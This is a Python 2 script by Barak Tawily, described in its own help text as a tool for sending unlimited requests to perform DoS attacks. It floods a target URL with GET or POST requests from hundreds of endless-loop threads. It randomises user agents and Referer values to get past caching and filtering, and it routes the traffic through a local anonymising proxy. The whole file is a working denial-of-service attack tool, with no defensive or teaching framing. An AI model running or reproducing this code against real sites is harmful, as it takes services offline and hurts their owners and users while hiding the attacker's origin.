import requests
import sys
import threading
import random
import re
import argparse

host=''
headers_useragents=[]
request_counter=0
printedMsgs = []

http_proxy  = "http://127.0.0.1:8118"
https_proxy = "https://127.0.0.1:8118"

proxyDict = { 
              "http"  : http_proxy, 
              "https" : https_proxy
}

def printMsg(msg):
	if msg not in printedMsgs:
		print "\n"+msg + " after %i requests" % request_counter
	printedMsgs.append(msg)

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)
	
def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def initHeaders():
	useragent_list()
	global headers_useragents, additionalHeaders
	headers = {
				'User-Agent': random.choice(headers_useragents),
				'Cache-Control': 'no-cache',
				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
				'Keep-Alive': str(random.randint(110,120)),
				'Connection': 'keep-alive'
				}

	if additionalHeaders:
		for header in additionalHeaders:
			headers.update({header.split(":")[0]:header.split(":")[1]})
	return headers

def handleStatusCodes(status_code):
	global request_counter
	sys.stdout.write("\r%i requests has been sent" % request_counter)
	sys.stdout.flush()
	if status_code == 429:
		printMsg("You have been throttled")
	if status_code == 500:
		printedMsg("Status code 500 received")

def sendGET(url):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		request = requests.get(url, headers=headers,proxies=proxyDict)
		# print 'her'
		handleStatusCodes(request.status_code)
	except:
		pass

def sendPOST(url, payload):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		if payload:
			request = requests.post(url, data=payload, headers=headers,proxies=proxyDict)
		else:
			request = requests.post(url, headers=headers,proxies=proxyDict)
		handleStatusCodes(request.status_code)
	except:
		pass

class SendGETThread(threading.Thread):
	def run(self):
		try:
			while True:
				global url
				sendGET(url)
		except:
			pass

class SendPOSTThread(threading.Thread):
	def run(self):
		try:
			while True:
				global url, payload
				sendPOST(url, payload)
		except:
			pass


# TODO:
# check if the site stop responding and alert

def main(argv):
	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
	args = parser.parse_args()

	global url, payload, additionalHeaders
	additionalHeaders = args.ah
	payload = args.d

	if args.g:
		url = args.g
		for i in range(args.t):
			t = SendGETThread()
			t.start()

	if args.p:
		url = args.p
		for i in range(args.t):
			t = SendPOSTThread()
			t.start()
	
	if len(sys.argv)==1:
		parser.print_help()
		exit()
	
if __name__ == "__main__":
   main(sys.argv[1:])
